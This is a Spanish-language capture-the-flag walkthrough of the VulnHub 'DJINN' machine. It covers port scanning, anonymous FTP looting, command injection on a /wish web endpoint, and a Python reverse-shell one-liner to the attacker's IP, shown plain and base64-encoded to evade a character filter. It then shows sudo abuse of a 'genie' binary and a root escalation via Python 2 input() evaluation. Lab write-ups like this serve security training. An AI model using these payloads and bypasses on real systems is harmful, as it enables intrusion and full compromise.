# DJINN
Desarrollo del CTF DJINN

## 1. Configuración de la VM

- Descarga de la VM: https://www.vulnhub.com/entry/djinn-1,397/
- La VM funciona bien en VmWare

## 2. Escaneo de Puertos

```
# Nmap 7.91 scan initiated Sun Apr 18 11:27:05 2021 as: nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.00068s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.10.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '-', 9)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '+', 5)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj1.jpg" width=80% />

## 3. Enumeración

### 3.1. Enumeración FTP

- FTP permite acceso anónimo. Descargamos los archivos y vemos lo que tenemos.

```
root@kali:~/DJINN# ftp 10.10.10.160
Connected to 10.10.10.160.
220 (vsFTPd 3.0.3)
Name (10.10.10.160:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
root@kali:~/DJINN# cat creds.txt
nitu:81299
root@kali:~/DJINN# cat game.txt
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
root@kali:~/DJINN# cat message.txt
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj2.jpg" width=80% />


- En resumen al parecer tenemos alguna credencial: "nitu:81299", nos hablan del puerto 1337 abierto y de un usuario "nitish81299". Tomamos nota.

### 3.2. Enumeración TCP/1337
 
- Encontramos un pequeño juego matemático. Intenté realizar alguna inyección sin exito.

```
root@kali:~/DJINN# nc 10.10.10.160 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(3, '*', 2)
> 6
(4, '-', 8)
> 
```

### 3.3. Enumeración HTTP TCP 7331

```
root@kali:~/tools/dirsearch# python3 dirsearch.py -u http://10.10.10.160:7331/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163783

Error Log: /root/tools/dirsearch/logs/errors-21-04-18_12-51-02.log

Target: http://10.10.10.160:7331/

Output File: /root/tools/dirsearch/reports/10.10.10.160/_21-04-18_12-51-02.txt

[12:51:02] Starting: 
[12:53:41] 200 -    2KB - /genie
[12:57:30] 200 -  385B  - /wish
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj3.jpg" width=80% />


- Encontramos un script que nos permite ejecutar comandos. Vamos bien.


## 4. Obteniendo SHELL

- Ya que tenemos un script vamos a intentar obtener una shell reversa, sin embargo, obtenemos mensajes de error. Antes de eso lo pasamos por el BURP.

```
POST /wish HTTP/1.1
Host: 10.10.10.160:7331
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.160:7331/wish
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Connection: close
Upgrade-Insecure-Requests: 1

cmd=id
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj4.jpg" width=80% />

- Todo parece fácil, sin embargo, algunos caracteres no estaban permitidos y eso limitada las operaciones: el punto (.), asterisco (*) y slash (/).
- Después de darle muchas vueltas (1 hora), teníamos que aplicar algun encode para obtener shell. BASE64.


```
//Texto sin ENCODE

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.131",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


//Texto con ENCODE
echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTAuMTMxIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc= | base64 -d | bash
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj5.jpg" width=80% />


## 5. Obteniendo acceso a un USUARIO del sistema

### 5.1. Primer Acceso (leyendo archivos)

- Encontramos el archivo CREDS.txt que tiene permiso de lectura.

```
www-data@djinn:/home$ ls -laR .
ls -laR .
.:
total 16
drwxr-xr-x  4 root   root   4096 Nov 14  2019 .
drwxr-xr-x 23 root   root   4096 Nov 11  2019 ..
drwxr-xr-x  6 nitish nitish 4096 Apr 19 02:14 nitish
drwxr-x---  4 sam    sam    4096 Nov 14  2019 sam

./nitish:
total 36
drwxr-xr-x 6 nitish nitish 4096 Apr 19 02:14 .
drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
-rw------- 1 root   root    130 Nov 12  2019 .bash_history
-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
drwx------ 2 nitish nitish 4096 Apr 19 02:14 .ssh
-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt
ls: cannot open directory './nitish/.cache': Permission denied

./nitish/.dev:
total 12
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .
drwxr-xr-x 6 nitish nitish 4096 Apr 19 02:14 ..
-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt
ls: cannot open directory './nitish/.gnupg': Permission denied
ls: cannot open directory './nitish/.ssh': Permission denied
ls: cannot open directory './sam': Permission denied
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj6.jpg" width=80% />

- La contraseña obtenida nitish:p4ssw0rdStr3r0n9. Listo no estuvo dificil.

### 5.2. Segundo Acceso (a través de SUDO)

- Encontramos el archivo user.txt. Nada importante.

```
nitish@djinn:~$ cat user.txt
cat user.txt
10aay8289ptgguy1pvfa73alzusyyx3c
```

- A través de SUDO parece que tenemos mayor probabilidad de encontrar algo.

```
nitish@djinn:~$ sudo -l
sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj7.jpg" width=80% />

- A través del script GENIE podemos lograr mayores accesos, sin embargo, después de muchos intentos NUNCA logré como utilizar el script.

```
nitish@djinn:~$ sudo -u sam /usr/bin/genie
sudo -u sam /usr/bin/genie
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
genie: error: the following arguments are required: wish
nitish@djinn:~$ sudo -u sam /usr/bin/genie -h
sudo -u sam /usr/bin/genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

- El script tenía un manual, tocaba leer el manual porque existe la opción CMD que estaba escondida. Moraleja siempre buscar el MANUAL de un script no conocido.

```
       -p, --shell

              Well who doesn't love those. You can get shell. Ex: -p "/bin/sh"

       -e, --exec

              Execute command on someone else computer is just too  damn  fun,
              but this comes with some restrictions.

       -cmd

              You know sometime all you new is a damn CMD, windows I love you.
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj8.jpg" width=80% />

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj9.jpg" width=80% />


```
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd whoami
sudo -u sam /usr/bin/genie -cmd whoami
my man!!
$ id
id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ whoami
whoami
sam
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
sam@djinn:~$ 
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj10.jpg" width=80% />


## 6. Elevar privilegios

- A través de SUDO podemos elevar privilegios como ROOT. 

```
sam@djinn:~$ sudo -l
sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
sam@djinn:~$ sudo -u root /root/lago
sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: 69
69
Better Luck next time
sam@djinn:~$ 
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj11.jpg" width=80% />


- Intenté realizar inyecciones a través las opciones, sin embargo, nada funcionó y el script no tenía un MANUAL. Se complicó todo.
- En la carpeta del usuario SAM existe un archivo inusual, el archivo .PYC. Un archivo python compilado.

```
sam@djinn:/home/sam$ cat .pyc
cat .pyc
�
��]c@s}ddlmZddlmZddlmZd�Zd�Zd�d�Z	�Z
e
 d	krye
e	��nd
S(
  i����(tgetuser(tsystem(trandintcCs	dGHdS(NsWorking on it!! ((((s/home/mzfr/scripts/exp.pyt
naughtyboscCsBtdd�}dGHtd�}||kr9td�ndGHdS(Niies"Choose a number between 1 to 100: sEnter your number: s/bin/shsBetter Luck next time(RtinputR(tnumts((s/home/mzfr/scripts/exp.pytguessit


cCs(t�}td�}d||fGHdS(Ns$Enter the full of the file to read: s!User %s is not allowed to read %s(RR(tusertpath((s/home/mzfr/scripts/exp.pyt	readfiless	
        cCs/dGHdGHdGHdGHdGHttd��}|S(NsWhat do you want to do ?s1 - Be naughtys2 - Guess the numbers3 - Read some damn files4 - WorksEnter your choice: (tintR(tchoice((s/home/mzfr/scripts/exp.pytoptionsscCs_|dkrt�nE|dkr,t�n/|dkrBt�n|dkrVdGHndGHdS(Niiiiswork your ass off!!s"Do something better with your life(RRR
(top((s/home/mzfr/scripts/exp.pytmain's

__main__N(
          tgetpassRtosRtrandomRRRR
R__name__(((s/home/mzfr/scripts/exp.py<module>s		
		
	
sam@djinn:/home/sam$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 14  2019 .
drwxr-xr-x 23 root   root   4096 Nov 11  2019 ..
drwxr-xr-x  6 nitish nitish 4096 Apr 19 02:14 nitish
drwxr-x---  4 sam    sam    4096 Nov 14  2019 sam
sam@djinn:/home/sam$ file .pyc
file .pyc
.pyc: python 2.7 byte-compiled
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj12.jpg" width=80% />

- Toca decompilar ese archivo python. Existe una página web que lo realiza ONLINE: https://www.toolnb.com/tools-lang-en/pyc.html

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj13.jpg" width=80% />

```
# uncompyle6 version 3.5.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.5 (default, Aug  7 2019, 00:51:29) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
# Embedded file name: /home/mzfr/scripts/exp.py
# Compiled at: 2019-11-07 21:05:18
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'


if __name__ == '__main__':
    main(options())
```

- Este extracto del código es el que nos ayuda. Si colocamos NUM cuando nos brinda shell. 

```
def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'
```


```
sam@djinn:/home/sam$ sudo -u root /root/lago
sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: num
num
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls
ls
lago  proof.sh
# cat proof.sh
cat proof.sh
#!/bin/bash

clear

figlet Amazing!!!

echo djinn pwned...
```

<img src="https://github.com/El-Palomo/DJINN/blob/main/dj14.jpg" width=80% />



